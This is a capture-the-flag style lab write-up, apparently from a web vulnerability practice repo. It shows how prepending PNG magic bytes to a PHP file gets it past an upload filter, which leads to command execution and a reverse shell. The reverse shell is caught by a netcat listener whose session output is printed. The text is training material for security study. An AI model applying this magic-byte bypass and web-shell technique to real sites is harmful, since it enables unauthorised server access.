# Insecure File Upload - Magic Bytes

- Upon revisiting the website, I got this interface:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/2d54d0d5-ffd1-4886-8286-c0159b70184f)

- Try to upload txt file, unfortunately it didn't worked.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/677ee334-bd77-47ad-89b3-d89490f91592)

- I upload a png file and Intercept the request to the burp suite and there I got request with image data.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/e65918ce-c70b-424f-9ab1-c394f29c3ed9)

- I try to upload a php file with php command into it, I got failed with a message that only "png" & "jpg" files are allowed.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/f46ea209-b653-48aa-ab21-d83d681c1e41)

- This indicated that the request is made from the server side not client side
- So here is something I can do with the magic bytes data of png file.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/35d48bbc-adeb-4101-ad21-e92dc9514f9a)

- After several attempts, I successfully able to upload the php file with command into it.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/ab4526e4-9d5d-4b83-a708-2c6d029021c9)

- Successfully navigating to the file, and by send the command along with the url I got results back.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/ad1aaf01-19ef-4fd7-810c-eb82d56122e0)

- Let's move to get a reverse shell back to our system.
- For this I inject PHP reverse shell and start Netcat to capture the request.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/edc7c18d-ed85-4f10-a531-adaf8b16651b)

- Upon navigating to the file I got the reverse shell back to my netcat listener.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/485b3175-8c03-44da-916d-2a5047882332)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.251.186] from (UNKNOWN) [172.18.0.4] 56618
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 06:53:53 up  3:23,  0 users,  load average: 0.39, 0.38, 0.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

### Task accomplished
